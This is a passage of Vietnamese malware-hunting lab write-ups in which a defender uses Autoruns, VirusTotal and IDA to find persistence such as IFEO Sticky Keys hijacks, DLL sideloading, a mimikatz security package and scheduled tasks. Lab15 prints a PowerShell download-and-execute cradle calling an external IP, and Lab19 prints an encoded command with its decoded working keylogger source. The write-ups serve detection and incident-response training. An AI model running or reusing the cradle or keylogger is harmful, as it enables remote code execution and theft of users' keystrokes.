  - Mã độc lợi dụng tính năng Sticky Keys của windows để thực hiện hành vi độc hại. Mã độc đã tạo registry trong `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe` với khóa là `debugger`, giá trị của khóa này xác định tệp thực thi sẽ gắn vào `sethc.exe` của Sticky Keys.
  - Khóa `debugger` sẽ chứa đường dẫn tới `cmd.exe`, khi chúng ta sử dụng tính năng Sticky keys của windows, thay vì bật `sethc.exe` lên để sử dụng tính năng thì sethc.exe sẽ được thay thế bằng cmd.exe để thực hiện hành vi độc hại.

- Bấm `Shift` liên tục thì xuất hiện `cmd.exe` thay vì `Sticky Keys`.

![2.png](./Lab11/2.png)

> Kết luận

- Thời gian mã độc xuất hiện: `...`.
- Đường dẫn mã độc: `...`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`.

# Lab12

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Có một vài mục bị đánh dấu đỏ bao gồm một số drive của VMware và 1 dll lạ được đăng ký trong Registry `HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`.

![1.png](./Lab12/1.png)

- Tiến hành `Jump Image` để tìm và kiểm tra file `NPIlium.dll`, dùng `certutil -hashfile <tên file>` để lấy hash file check trên Virus Total `2a8519c22f802abb4babd2c33ceedcbab777e4a9` thì file không có cảnh báo đỏ.

![2.png](./Lab12/2.png)

- Sau khi đi tìm hiểu thì hành vi thay đổi giá trị trong Registry `HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order` được coi là hành động nguy hiểm vì nó thay đổi `các Dịch vụ được đăng ký là Nhà cung cấp Mạng` dẫn đến khi dll được load sẽ tạo kết nối qua mạng.

  - https://www.socinvestigation.com/credential-dumping-using-windows-network-providers-how-to-respond/
  - https://www.giac.org/paper/gcih/117/microsoft-network-provider-exploit/101145

- Ở đây có thể là đang cố tiến hành dump lấy tài khoản mật khẩu sử dụng `Windows Network Provider`.

> Kết luận

- Thời gian mã độc xuất hiện: `...`.
- Đường dẫn mã độc: `...`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`.

# Lab13

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` IDA Pro.

- `3.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Có một số mục bị cảnh báo đỏ thì sau khi check đều không có vấn đề gì trên virustotal (đây là các drive của vmware,...), check lại thi phát hiện một mục khả nghi do sai đường dẫn.

![1.png](./Lab13/1.png)

- File `C:\Program Files\PRTG Network Monitor\lsm.exe` được đăng ký với tên `PRTG` trong Registry `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` nằm ở đường dẫn sai mặc định của chương trình `LMS.exe`.

![2.png](./Lab13/2.png)

- Khi check hash của file `d6dd19ec3c27f51ef4c7e6befd7d436005aea4b1` trên Virustotal thì lại chỉ thấy có 1 cảnh báo đỏ.

![3.png](./Lab13/3.png)

- Vì vậy ta sẽ tiến hành phân tích file này để tìm các thành phần liên quan đến file nghi ngờ này.

- Khi dùng IDA để phân tích chương trình ta thấy chương trình load rất nhiều các dll dưới dạng chỉ truyền tên dll vào để load và sau đó chương trình sẽ theo thứ tự của `dll search order` của microsoft để tìm dll (có thể dễ bị dll sideloading).

- Trong các dll được load bên trong chương trình thì có 1 dll được load mà ta tìm thấy nó nằm cùng folder với file `lms.exe` là `TmDbgLog.dll`.

![4.png](./Lab13/4.png)

- Khi check hash `009457D6677684E09D52AA4C5DED40D509D6727As` trên Virustotal thì có 36/70 cảnh báo.

![5.png](./Lab13/5.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Friday, December 25, 2020, 11:12:06 AM`.
- Đường dẫn mã độc: `C:\Program Files\PRTG Network Monitor\TmDbgLog.dll`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.

# Lab14

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Có một số mục bị cảnh báo đỏ thì sau khi check đều không có vấn đề gì trên virustotal (đây là các drive của vmware,...), check lại thi phát hiện một mục khả nghi do sai đường dẫn.

![1.png](./Lab14/1.png)

- File `C:\Windows\QcConsol.exe` được đăng ký với tên `Windows HD Audio Manager` trong Registry `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` với Verified của `McAfee` nhưng lại nằm ở dường dẫn lạ là ngay bên trong folder `C:\Windows`.

- Khi check hash file `DAA69D1B1ABC00139B1D73D075921AB93137598D` trên Virustotal thì không có cảnh báo.

![2.png](./Lab14/2.png)

- Khi check hash cùa file dll `C:\Windows\QcLite.dll` - `3752656C024284EA63421D70235EC48D76A95DF3` trên Virustotal thì có 51/68 cảnh báo.

  - https://www.vietsunshine.com.vn/2020/02/13/phan-tich-ma-doc-cua-apt41-nham-vao-cac-doanh-nghiep-viet-nam/

![3.png](./Lab14/3.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Friday, December 25, 2020, 2:26:47 PM`.
- Đường dẫn mã độc: `C:\Windows\QcLite.dll`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.

# Lab15

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Có một số mục bị cảnh báo đỏ thì sau khi check đều không có vấn đề gì trên virustotal (đây là các drive của vmware,...), check lại thi phát hiện một mục khả nghi do sử dụng powershell để thực thi câu lệnh.

![1.png](./Lab15/1.png)

- Câu lệnh khả nghi nhằm thực hiện hành vi download malware bằng PowerShell, và được lưu vào WMI Database Entries rồi sau đó tự thực thi bằng PowerShell với option `hidden` để thực hiện hành vi độc hại.

```ps1
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://39.109.114.56:80/a'))
```

> Kết luận

- Thời gian mã độc xuất hiện: `...`.
- Đường dẫn mã độc: `...`.
- Cách thức mã độc persistence trên hệ thống: Registry `WMI Database Entries`.

# Lab16

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

![1.png](./Lab16/1.png)

- File `C:\Users\Public\RegAsm.exe` chưa được verified nên kiểm tra thông qua check hash lên virustotal.

- Dùng `certutil -hashfile <tên file>` được dùng để lấy hash file: `95b266a4a5b66846c53e57a0bafcc1d990262283`, check trên Virus Total xem có cảnh báo đỏ hay không thì thu được cảnh báo đỏ 54/71. Note vào và đưa cho bên khác phân tích và khắc phục.

![2.png](./Lab16/2.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Tuesday, January 26, 2021, 11:00:02 AM`.
- Đường dẫn mã độc: `C:\Users\Public\RegAsm.exe`.
- Cách thức mã độc persistence trên hệ thống: `Task Scheduler`.

# Lab17

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Khi khởi động sẽ thấy ngay 1 dịch vụ tên là `30000` được đăng ký trong Registry `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells\AvailableShells` và thực thi một commandline lạ với nội dung:

```ps1
cmd.exe /c "cd /d "%USERPROFILE%" & start cmd.exe /k runonce.exe /AlternateShellStartup"
```

![1.png](./Lab17/1.png)

- Commandline trên sẽ di chuyển đến folder `%USERPROFILE%` và thực thi file `runonce.exe` nhưng khi tiến hành tìm file trên để check hash thì không thấy file.

- Tiếp tục tìm kiếm thì phát hiện một dịch vụ tên `mimilib` đăng kỳ trong registry `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` và file là đường dẫn `C:\Windows\System\mimilib.dll`.

- File `C:\Windows\System\mimilib.dll` là dll dược load trong 1 tools nổi tiếng được hacker dùng để dump và thu thập các tài khoản và mật khẩu của người dùng trên hệ thống windows là `mimikatz`.

![2.png](./Lab17/2.png)

- Dùng `certutil -hashfile <tên file>` được dùng để lấy hash file: `AFC1320D4C9BE5C3B57FB18DE4BA3555CD3BC3B1`, check trên Virus Total:

![3.png](./Lab17/3.png)

- Tools mimikatz nằm trong thư mục `C:\Windows\System32` của hệ thống.

![4.png](./Lab17/4.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Wednesday, January 27, 2021, 1:49:03 PM`.
- Đường dẫn mã độc: `C:\Windows\System32\mimilib.dll`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`.

# Lab18

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` sigcheck.exe (Sysinternals Suite).

- `3.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Khi khởi động sẽ thấy ngay 1 dịch vụ tên là `30000` được đăng ký trong Registry `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells\AvailableShells` và thực thi một commandline lạ với nội dung:

```ps1
cmd.exe /c "cd /d "%USERPROFILE%" & start cmd.exe /k runonce.exe /AlternateShellStartup"
```

![1.png](./Lab18/1.png)

- Commandline trên sẽ di chuyển đến folder `%USERPROFILE%` và thực thi file `runonce.exe` nhưng khi tiến hành tìm file trên để check hash thì không thấy file.

- Tiếp tục tìm kiếm thì phát hiện một dịch vụ tên `\Microsoft\Windows\NVIDIA Helper` đăng ký trong `Task Scheduler` và file là đường dẫn `c:\windows\apppatch\nvsmart.exe`.

- File được `(Verified) NVIDIA Corporation` nhưng nằm ở một đường dẫn lạ nên sẽ tiến hành check hash file này và các file nằm trong cùng folder (VD như .dll,...).

- Dùng `certutil -hashfile <tên file>` được dùng để lấy hash file `c:\windows\apppatch\nvsmart.exe`: `6474D0369F97E72E01E4971128D1062F5C2B3656`, check trên Virus Total:

![2.png](./Lab18/2.png)

- Chỉ có 1 cảnh báo duy nhất liên quan đến mã độc, ta sẽ tiến hành phân tích các file liên quan bên trong folder này (đoạn này là do khi tra google với key là tên file `nvsmart.exe` thì thấy có 1 malware có liên quan sử dụng kỹ thuật dll sideloading).

- Sử dụng tools `sigcheck.exe` của windows để lấy hash của tất cả cá file nằm trong folder này `sigcheck.exe -h -a . >> C:\Users\hunter\Desktop\txt.txt`.

![3.png](./Lab18/3.png)

- Check hash lần lượt của tất cả các file thì hash file `NvSmartMax.dll`: `305B9F2853F4F344FEC1CD449929B9CFE4DAE904` có 44/71 cảnh báo đỏ, check trên Virus Total:

![4.png](./Lab18/4.png)

> Kết luận

- https://blogs.blackberry.com/en/2019/09/pcshare-backdoor-attacks-targeting-windows-users-with-fakenarrator-malware
- Thời gian mã độc xuất hiện: `Date Created: Wednesday, January 27, 2021, 2:07:38 PM`.
- Đường dẫn mã độc: `c:\windows\apppatch\NvSmartMax.dll`.
- Cách thức mã độc persistence trên hệ thống: sideloading file được đăng ký trong `Task Scheduler`.

# Lab19

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Khi khởi động sẽ thấy ngay 1 dịch vụ tên là `30000` được đăng ký trong Registry `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells\AvailableShells` và thực thi một commandline lạ với nội dung:

```ps1
cmd.exe /c "cd /d "%USERPROFILE%" & start cmd.exe /k runonce.exe /AlternateShellStartup"
```

- Commandline trên sẽ di chuyển đến folder `%USERPROFILE%` và thực thi file `runonce.exe` nhưng khi tiến hành tìm file trên để check hash thì không thấy file.

- Tiếp tục tìm kiếm thì có 1 entry lạ trong `Task Scheduler` nhưng không có file thực thi, tiến hành `Jump to` đến kiểm tra trong `Task Scheduler`.

![1.png](./Lab19/1.png)

- Kiểm tra trong `Task Scheduler` thì thấy có 1 event được đăng ký.

![2.png](./Lab19/2.png)

- Kiểm tra phần action của event thì thấy event này khởi động cùng với máy tính khi bất kỳ user nào log on và thực thi một câu lệnh powershell với nội dung:

```ps1
powershell -windowstyle hidden -EncodedCommand IwByAGUAcQB1AGkAcgBlAHMAIAAtAFYAZQByAHMAaQBvAG4AIAAyAAoAZgB1AG4AYwB0AGkAbwBuACAAUwB0AGEAcgB0AC0ASwBlAHkATABvAGcAZwBlAHIAKAAkAFAAYQB0AGgAPQAiACQAZQBuAHYAOgB0AGUAbQBwAFwAbABvAGcAZgBpAGwAZQAuAHQAeAB0ACIAKQAgAAoAewAKACAAIAAjACAAUwBpAGcAbgBhAHQAdQByAGUAcwAgAGYAbwByACAAQQBQAEkAIABDAGEAbABsAHMACgAgACAAJABzAGkAZwBuAGEAdAB1AHIAZQBzACAAPQAgAEAAJwAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgAsACAAQwBoAGEAcgBTAGUAdAA9AEMAaABhAHIAUwBlAHQALgBBAHUAdABvACwAIABFAHgAYQBjAHQAUwBwAGUAbABsAGkAbgBnAD0AdAByAHUAZQApAF0AIAAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAHMAaABvAHIAdAAgAEcAZQB0AEEAcwB5AG4AYwBLAGUAeQBTAHQAYQB0AGUAKABpAG4AdAAgAHYAaQByAHQAdQBhAGwASwBlAHkAQwBvAGQAZQApADsAIAAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgAsACAAQwBoAGEAcgBTAGUAdAA9AEMAaABhAHIAUwBlAHQALgBBAHUAdABvACkAXQAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAARwBlAHQASwBlAHkAYgBvAGEAcgBkAFMAdABhAHQAZQAoAGIAeQB0AGUAWwBdACAAawBlAHkAcwB0AGEAdABlACkAOwAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgAsACAAQwBoAGEAcgBTAGUAdAA9AEMAaABhAHIAUwBlAHQALgBBAHUAdABvACkAXQAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAATQBhAHAAVgBpAHIAdAB1AGEAbABLAGUAeQAoAHUAaQBuAHQAIAB1AEMAbwBkAGUALAAgAGkAbgB0ACAAdQBNAGEAcABUAHkAcABlACkAOwAKAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgAsACAAQwBoAGEAcgBTAGUAdAA9AEMAaABhAHIAUwBlAHQALgBBAHUAdABvACkAXQAKAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAAVABvAFUAbgBpAGMAbwBkAGUAKAB1AGkAbgB0ACAAdwBWAGkAcgB0AEsAZQB5ACwAIAB1AGkAbgB0ACAAdwBTAGMAYQBuAEMAbwBkAGUALAAgAGIAeQB0AGUAWwBdACAAbABwAGsAZQB5AHMAdABhAHQAZQAsACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AUwB0AHIAaQBuAGcAQgB1AGkAbABkAGUAcgAgAHAAdwBzAHoAQgB1AGYAZgAsACAAaQBuAHQAIABjAGMAaABCAHUAZgBmACwAIAB1AGkAbgB0ACAAdwBGAGwAYQBnAHMAKQA7AAoAJwBAAAoACgAgACAAIwAgAGwAbwBhAGQAIABzAGkAZwBuAGEAdAB1AHIAZQBzACAAYQBuAGQAIABtAGEAawBlACAAbQBlAG0AYgBlAHIAcwAgAGEAdgBhAGkAbABhAGIAbABlAAoAIAAgACQAQQBQAEkAIAA9ACAAQQBkAGQALQBUAHkAcABlACAALQBNAGUAbQBiAGUAcgBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABzAGkAZwBuAGEAdAB1AHIAZQBzACAALQBOAGEAbQBlACAAJwBXAGkAbgAzADIAJwAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIABBAFAASQAgAC0AUABhAHMAcwBUAGgAcgB1AAoAIAAgACAAIAAKACAAIAAjACAAYwByAGUAYQB0AGUAIABvAHUAdABwAHUAdAAgAGYAaQBsAGUACgAgACAAJABuAHUAbABsACAAPQAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACQAUABhAHQAaAAgAC0ASQB0AGUAbQBUAHkAcABlACAARgBpAGwAZQAgAC0ARgBvAHIAYwBlAAoACgAgACAAdAByAHkACgAgACAAewAKACAAIAAgACAAIwBXAHIAaQB0AGUALQBIAG8AcwB0ACAAJwBSAGUAYwBvAHIAZABpAG4AZwAgAGsAZQB5ACAAcAByAGUAcwBzAGUAcwAuACAAUAByAGUAcwBzACAAQwBUAFIATAArAEMAIAB0AG8AIABzAGUAZQAgAHIAZQBzAHUAbAB0AHMALgAnACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFIAZQBkAAoACgAgACAAIAAgACMAIABjAHIAZQBhAHQAZQAgAGUAbgBkAGwAZQBzAHMAIABsAG8AbwBwAC4AIABXAGgAZQBuACAAdQBzAGUAcgAgAHAAcgBlAHMAcwBlAHMAIABDAFQAUgBMACsAQwAsACAAZgBpAG4AYQBsAGwAeQAtAGIAbABvAGMAawAKACAAIAAgACAAIwAgAGUAeABlAGMAdQB0AGUAcwAgAGEAbgBkACAAcwBoAG8AdwBzACAAdABoAGUAIABjAG8AbABsAGUAYwB0AGUAZAAgAGsAZQB5ACAAcAByAGUAcwBzAGUAcwAKACAAIAAgACAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsACgAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAE0AaQBsAGwAaQBzAGUAYwBvAG4AZABzACAANAAwAAoAIAAgACAAIAAgACAACgAgACAAIAAgACAAIAAjACAAcwBjAGEAbgAgAGEAbABsACAAQQBTAEMASQBJACAAYwBvAGQAZQBzACAAYQBiAG8AdgBlACAAOAAKACAAIAAgACAAIAAgAGYAbwByACAAKAAkAGEAcwBjAGkAaQAgAD0AIAA5ADsAIAAkAGEAcwBjAGkAaQAgAC0AbABlACAAMgA1ADQAOwAgACQAYQBzAGMAaQBpACsAKwApACAAewAKACAAIAAgACAAIAAgACAAIAAjACAAZwBlAHQAIABjAHUAcgByAGUAbgB0ACAAawBlAHkAIABzAHQAYQB0AGUACgAgACAAIAAgACAAIAAgACAAJABzAHQAYQB0AGUAIAA9ACAAJABBAFAASQA6ADoARwBlAHQAQQBzAHkAbgBjAEsAZQB5AFMAdABhAHQAZQAoACQAYQBzAGMAaQBpACkACgAKACAAIAAgACAAIAAgACAAIAAjACAAaQBzACAAawBlAHkAIABwAHIAZQBzAHMAZQBkAD8ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAHMAdABhAHQAZQAgAC0AZQBxACAALQAzADIANwA2ADcAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACQAbgB1AGwAbAAgAD0AIABbAGMAbwBuAHMAbwBsAGUAXQA6ADoAQwBhAHAAcwBMAG8AYwBrAAoACgAgACAAIAAgACAAIAAgACAAIAAgACMAIAB0AHIAYQBuAHMAbABhAHQAZQAgAHMAYwBhAG4AIABjAG8AZABlACAAdABvACAAcgBlAGEAbAAgAGMAbwBkAGUACgAgACAAIAAgACAAIAAgACAAIAAgACQAdgBpAHIAdAB1AGEAbABLAGUAeQAgAD0AIAAkAEEAUABJADoAOgBNAGEAcABWAGkAcgB0AHUAYQBsAEsAZQB5ACgAJABhAHMAYwBpAGkALAAgADMAKQAKAAoAIAAgACAAIAAgACAAIAAgACAAIAAjACAAZwBlAHQAIABrAGUAeQBiAG8AYQByAGQAIABzAHQAYQB0AGUAIABmAG8AcgAgAHYAaQByAHQAdQBhAGwAIABrAGUAeQBzAAoAIAAgACAAIAAgACAAIAAgACAAIAAkAGsAYgBzAHQAYQB0AGUAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMgA1ADYACgAgACAAIAAgACAAIAAgACAAIAAgACQAYwBoAGUAYwBrAGsAYgBzAHQAYQB0AGUAIAA9ACAAJABBAFAASQA6ADoARwBlAHQASwBlAHkAYgBvAGEAcgBkAFMAdABhAHQAZQAoACQAawBiAHMAdABhAHQAZQApAAoACgAgACAAIAAgACAAIAAgACAAIAAgACMAIABwAHIAZQBwAGEAcgBlACAAYQAgAFMAdAByAGkAbgBnAEIAdQBpAGwAZABlAHIAIAB0AG8AIAByAGUAYwBlAGkAdgBlACAAaQBuAHAAdQB0ACAAawBlAHkACgAgACAAIAAgACAAIAAgACAAIAAgACQAbQB5AGMAaABhAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AUwB0AHIAaQBuAGcAQgB1AGkAbABkAGUAcgAKAAoAIAAgACAAIAAgACAAIAAgACAAIAAjACAAdAByAGEAbgBzAGwAYQB0AGUAIAB2AGkAcgB0AHUAYQBsACAAawBlAHkACgAgACAAIAAgACAAIAAgACAAIAAgACQAcwB1AGMAYwBlAHMAcwAgAD0AIAAkAEEAUABJADoAOgBUAG8AVQBuAGkAYwBvAGQAZQAoACQAYQBzAGMAaQBpACwAIAAkAHYAaQByAHQAdQBhAGwASwBlAHkALAAgACQAawBiAHMAdABhAHQAZQAsACAAJABtAHkAYwBoAGEAcgAsACAAJABtAHkAYwBoAGEAcgAuAEMAYQBwAGEAYwBpAHQAeQAsACAAMAApAAoACgAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABzAHUAYwBjAGUAcwBzACkAIAAKACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIABhAGQAZAAgAGsAZQB5ACAAdABvACAAbABvAGcAZwBlAHIAIABmAGkAbABlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAQQBwAHAAZQBuAGQAQQBsAGwAVABlAHgAdAAoACQAUABhAHQAaAAsACAAJABtAHkAYwBoAGEAcgAsACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQApACAACgAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0ACgAgACAAfQAKACAAIABmAGkAbgBhAGwAbAB5AAoAIAAgAHsACgAgACAAIAAgACMAIABvAHAAZQBuACAAbABvAGcAZwBlAHIAIABmAGkAbABlACAAaQBuACAATgBvAHQAZQBwAGEAZAAKACAAIAAgACAAIwAgAG4AbwB0AGUAcABhAGQAIAAkAFAAYQB0AGgACgAgACAAfQAKAH0ACgAKACMAIAByAGUAYwBvAHIAZABzACAAYQBsAGwAIABrAGUAeQAgAHAAcgBlAHMAcwBlAHMAIAB1AG4AdABpAGwAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAYgBvAHIAdABlAGQAIABiAHkAIABwAHIAZQBzAHMAaQBuAGcAIABDAFQAUgBMACsAQwAKACMAIAB3AGkAbABsACAAdABoAGUAbgAgAG8AcABlAG4AIAB0AGgAZQAgAGYAaQBsAGUAIAB3AGkAdABoACAAYwBvAGwAbABlAGMAdABlAGQAIABrAGUAeQAgAGMAbwBkAGUAcwAKAFMAdABhAHIAdAAtAEsAZQB5AEwAbwBnAGcAZQByAA
```

- Decode mã hóa base64 cho đối số được thực thi bởi powershell

```ps1
#requires -Version 2
function Start-KeyLogger($Path="$env:temp\logfile.txt")
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    #Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
    while ($true) {
      Start-Sleep -Milliseconds 40

      # scan all ASCII codes above 8
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)

        # is key pressed?
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          # translate scan code to real code
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          # get keyboard state for virtual keys
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

          # prepare a StringBuilder to receive input key
          $mychar = New-Object -TypeName System.Text.StringBuilder

          # translate virtual key
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success)
          {
            # add key to logger file
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
          }
        }
      }
    }
  }
  finally
  {
    # open logger file in Notepad
    # notepad $Path
  }
}

# records all key presses until script is aborted by pressing CTRL+C
# will then open the file with collected key codes
Start-KeyLogger
```

- Mã độc là một đoạn mã PowerShell được đăng kí autoruns trong Task Scheduler, đoạn mã là một chương trình keylogger đơn giản, sử dụng API windows để nhận các kí tự khi người dùng nhập và ghi vào file `C:\Users\hunter\AppData\Local\Temp\logfile.txt`.

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: 1/28/2021 4:28:26 PM`.
- Đường dẫn mã độc: `...`.
- Cách thức mã độc persistence trên hệ thống: `Task Scheduler`.

# Lab20

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

![1.png](./Lab20/1.png)

- Có 1 Entry bị cảnh báo đỏ và file thực thi `C:\Users\hunter\AppData\Roaming\WPDNSE\svchost.exe` không có verified, `jump to` đến để check hash file.

- Dùng `certutil -hashfile <tên file>` được dùng để lấy hash file `svchost.exe`: `A9028E32A50C50614C8796D8FFED9D58BBB6A8A1s`, check trên Virus Total xem có cảnh báo đỏ hay không thì thu được cảnh báo đỏ 52/74. Note vào và đưa cho bên khác phân tích và khắc phục.

![2.png](./Lab20/2.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Thursday, January 28, 2021, 5:00:28 PM`.
- Đường dẫn mã độc: `C:\Users\hunter\AppData\Roaming\WPDNSE\svchost.exe`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
